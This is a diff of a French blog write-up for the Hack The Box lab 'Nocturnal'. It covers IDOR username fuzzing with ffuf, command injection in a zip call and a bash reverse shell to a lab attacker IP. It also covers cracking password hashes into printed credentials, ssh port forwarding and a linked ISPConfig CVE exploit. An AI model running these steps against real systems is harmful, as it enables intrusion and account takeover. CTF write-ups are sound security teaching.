@@ -53,20 +53,21 @@
       <h1 id="summary">Summary</h1>
 <h2 id="foothold">Foothold</h2>
 <ul>
-  <li>Idor nous permet de lire les fichiers des autres</li>
-  <li>On trouve par un fuzzing l’utilisateur <code class="language-plaintext highlighter-rouge">amanda</code>
-</li>
-  <li>Le fichier stocké par <code class="language-plaintext highlighter-rouge">amanda</code> nous donne un mot de passe pour son compte</li>
-  <li>On utilise la page admin pour lire <code class="language-plaintext highlighter-rouge">admin.php</code>
-</li>
-  <li>En échappant le contexte de la commande <code class="language-plaintext highlighter-rouge">zip</code> on obtient un shell
+  <li>Idor nous permet de lire les fichiers des autres.</li>
+  <li>Une attaque par dictionnaire (fuzzing) montre l’utilisateur <code class="language-plaintext highlighter-rouge">amanda</code>.</li>
+  <li>Le fichier stocké par <code class="language-plaintext highlighter-rouge">amanda</code> révèle un mot de passe pour son compte.</li>
+  <li>La page admin permet d’afficher le contenu de <code class="language-plaintext highlighter-rouge">admin.php</code>.</li>
+  <li>En échappant le contexte de la commande <code class="language-plaintext highlighter-rouge">zip</code> on obtient un shell.
     <h2 id="privesc">PrivEsc</h2>
   </li>
-  <li>Une bdd nous donne l’utilisateur <code class="language-plaintext highlighter-rouge">tobias</code>
-</li>
-  <li>Le service <code class="language-plaintext highlighter-rouge">ispconfig</code> tourne sur le port <code class="language-plaintext highlighter-rouge">8080</code>, on le forward</li>
-  <li>On se connecte à <code class="language-plaintext highlighter-rouge">admin</code> avec le mdp de tobias</li>
-  <li>Une CVE nous donne notre root shell.</li>
+  <li>La bdd contient les infos de l’utilisateur <code class="language-plaintext highlighter-rouge">tobias</code>, dont son mot de passe.</li>
+  <li>Le service <code class="language-plaintext highlighter-rouge">ispconfig</code> tourne sur le port <code class="language-plaintext highlighter-rouge">8080</code>, il est possible d’y accéder grâce à un forward ssh.</li>
+  <li>Le compte <code class="language-plaintext highlighter-rouge">admin</code> peut être accédé avec le mdp de tobias</li>
+  <li>
+<a href="https://github.com/ajdumanhug/CVE-2023-46818" class="web-link">Une CVE</a> donne root shell.
+    <h2 id="trouver-les-solutions">Trouver les solutions</h2>
+  </li>
+  <li>Puisqu’il faut donner à César ce qui revient à Ognon (et un peu à loutre aussi), je tiens à remercier Ognon (et un peu loutre aussi) pour son aide à travers cette box et sa patience pour m’aider à débugger mes petits soucis de vpn.</li>
 </ul>
 
 <h1 id="foothold-1">Foothold</h1>
@@ -83,26 +84,24 @@
   <li><code class="language-plaintext highlighter-rouge">uploads2</code></li>
 </ul>
 
-<p>Le site en lui-même ne nous indique rien.</p>
+<p>Le site en lui-même n’indique rien.</p>
 <p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/nocturnal%20images/Pasted%20image%2020260410143807.png"></span></p>
 
-<p>On s’inscrit sur <code class="language-plaintext highlighter-rouge">register.php</code> et on obtient notre accès, après quoi on peut upload des fichiers.</p>
+<p>La page <code class="language-plaintext highlighter-rouge">register.php</code> permet de s’inscrire et obtenir un accès, après quoi on peut charger des des fichiers via upload.</p>
 <p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/nocturnal%20images/Pasted%20image%2020260410143903.png"></span></p>
 
-<p>On upload un fichier et on obtient ainsi un lien pour télécharger notre fichier:</p>
+<p>Après avoir upload un fichier le site répond avec un lien pour télécharger le fichier.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://nocturnal.htb/view.php?username=guest&amp;file=oogway.pdf
 </code></pre></div></div>
 
-<p>On va tester d’upload en utilisant le nom d’un autre utilisateur, <code class="language-plaintext highlighter-rouge">admin</code> par exemple (on se foute qu’il existe puisqu’on a pas pu créer d’utilisateur admin).</p>
-
-<p>On voit assez vite qu’une idor est possible, on change le nom pour <code class="language-plaintext highlighter-rouge">leet</code> on voit que l’utilisateur n’existe pas mais <code class="language-plaintext highlighter-rouge">admin</code> existe mais ne retourne rien. On fuzz donc les utilisateurs avec la seclist <code class="language-plaintext highlighter-rouge">Usernames/Names/names.txt</code> et on obtient qu’un autre utilisateur, <code class="language-plaintext highlighter-rouge">amanda</code>, existe.</p>
+<p>On voit assez vite qu’une idor est possible en changeant le nom pour <code class="language-plaintext highlighter-rouge">leet</code> l’utilisateur n’existe pas mais <code class="language-plaintext highlighter-rouge">admin</code> existe, il ne montre en revanche aucun fichier stocké. En effectuant une attaque par dictionnaire (fuzzing), il est possible de trouver un autre utilisateur qui existe et possède des fichiers sur la machine, pour cela la seclist <code class="language-plaintext highlighter-rouge">Usernames/Names/names.txt</code> est très utile. On obtient bien un autre utilisateur, <code class="language-plaintext highlighter-rouge">amanda</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&amp;file=.pdf" -H 'Cookie: PHPSESSID=n0spgp65idb08uk27jh1vkjr4a' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -fs 2985
 </code></pre></div></div>
 
 <p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/nocturnal%20images/Pasted%20image%2020260410164924.png"></span></p>
 
-<p>On se rend sur sa page et bingo, on obtient un fichier intéressant.</p>
+<p>En se rendant sur sa page on est accueillis en effet avec un fichier intéressant.</p>
 
 <p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/nocturnal%20images/Pasted%20image%2020260410165001.png"></span></p>
 
@@ -141,6 +140,8 @@ Nocturnal's IT team
 }
 </code></pre></div></div>
 
+<p>(je tiens à préciser que c’est à cette partie qu’Ognon le grand m’a aidé, je lui dois d’avoir continué)</p>
+
 <p>On va tirer avantage du parsing et break out de la commande pour exécuter ce que l’on souhaite. On créé d’abord un fichier <code class="language-plaintext highlighter-rouge">shell</code>.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.15.23/4444 0&gt;&amp;1'
 </code></pre></div></div>
@@ -164,11 +165,11 @@ f38cde1654b39fea2bd4f72f1ae4cdda
 EOF
 </code></pre></div></div>
 
-<p>Et on crack ce fichier avec hashcat (sha1). On finit par en trouver un que l’on crack</p>
+<p>Et on craque ce fichier avec hashcat (md5, mode 0). On finit par en trouver un que l’on craque</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
 </code></pre></div></div>
 
-<p>C’est celui de tobias, on a donc des creds en plus: <code class="language-plaintext highlighter-rouge">tobias:slowmotionapocalypse</code></p>
+<p>C’est celui de tobias, on a donc des identifiants en plus: <code class="language-plaintext highlighter-rouge">tobias:slowmotionapocalypse</code></p>
 
 <p>Et voilà, notre accès ssh.</p>
 <p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/nocturnal%20images/Pasted%20image%2020260411142300.png"></span></p>
@@ -176,6 +177,8 @@ EOF
 <p>On n’oublie pas le flag user bien sûr.</p>
 
 <h1 id="privesc-to-root">PrivEsc to root</h1>
+
+<p>(Ognon ne m’a pas donné la réponse mais il m’a donné quelques conseils sur les pratiques à suivre, avec loutre, merci à eux)</p>
 
 <p>On remarque un process qui tourne sur le port <code class="language-plaintext highlighter-rouge">8080</code>. On le forward en localhost pour pouvoir y accéder:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 9001:localhost:8080 -N -vv tobias@nocturnal.htb
